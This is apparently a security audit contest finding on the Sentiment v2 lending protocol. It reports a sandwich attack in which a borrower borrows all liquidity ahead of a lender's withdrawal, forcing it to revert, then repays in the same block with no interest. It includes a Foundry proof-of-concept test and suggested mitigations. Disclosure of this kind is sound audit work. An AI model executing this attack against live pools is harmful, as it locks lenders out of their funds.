Glamorous Blush Gecko

High

# An attacker can permanently DOS lender from withdrawing by a sandwich attack

### Summary

If a user borrows and repays a loan within the same block they do not pay any interest

Therefore an attacker can sandwich a lender trying to withdraw funds by borrowing those funds, to ensure the lender's tx reverts and then backrunning the lender's withdraw tx by repaying those funds, all within the same block to ensure 0 interest.

### Root Cause

No intra-block interest accumulation

Allowing intrablock borrow and repays

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Lender sends a tx to [withdraw](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/Pool.sol#L339) funds
2. Frontrun (1) by depositing collateral and then borrowing an amount of assets to make (1) revert
3. Backrun the reverted Tx by repaying the loan all within the same block to ensure no interest accumulates

### Impact

Attacker can permanently DOS a lender withdrawing their funds, the cost of the attack is only the gas cost of the tx

### PoC

Add the following to `BigTest.t.sol`

```solidity
function test__BorrowerFrontRunsLenderWithdrawal() public {
    uint256 depositAmount = 100 ether;
    uint256 borrowAmount = 100 ether;

    // Lender deposits
    vm.startPrank(lender);
    asset1.mint(lender, depositAmount);
    asset1.approve(address(pool), depositAmount);
    pool.deposit(linearRatePool, depositAmount, lender);
    vm.stopPrank();

    // Attacker setup
    vm.startPrank(user);
    (address position, Action memory newPositionAction) = newPosition(user, "test-position");
    positionManager.process(position, newPositionAction);

    // Simulate front-running: 
    // Attacker deposits collateral
    // Attacker borrows all available funds
    asset2.mint(user, 200 ether);
    asset2.approve(address(positionManager), 200 ether);
    Action[] memory setupActions = new Action[](2);
    setupActions[0] = addToken(address(asset2));
    setupActions[1] = deposit(address(asset2), 200 ether);
    positionManager.processBatch(position, setupActions);

    Action memory borrowAction = borrow(linearRatePool, borrowAmount);
    positionManager.process(position, borrowAction);
    vm.stopPrank();

    // Lender attempts to withdraw, which will revert
    vm.prank(lender);
    vm.expectRevert(abi.encodeWithSelector(Pool.Pool_InsufficientWithdrawLiquidity.selector, linearRatePool, 0, depositAmount));
    pool.withdraw(linearRatePool, depositAmount, lender, lender);

    // Attacker repays the full amount, without paying any interest
    vm.startPrank(user);
    asset1.approve(address(positionManager), borrowAmount);
    Action memory repayAction = Action({
        op: Operation.Repay,
        data: abi.encode(linearRatePool, borrowAmount)
    });
    positionManager.process(position, repayAction);
    vm.stopPrank();
```

Console output:

```bash
Ran 1 test for test/integration/BigTest.t.sol:BigTest
[PASS] test__BorrowerFrontRunsLenderWithdrawal() (gas: 783412)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.61ms (815.19µs CPU time)

Ran 1 test suite in 5.94ms (4.61ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Mitigation

1. Implement intra-block interest accumulation to make this expensive for the attacker
2. Implement a time interval between deposits and repays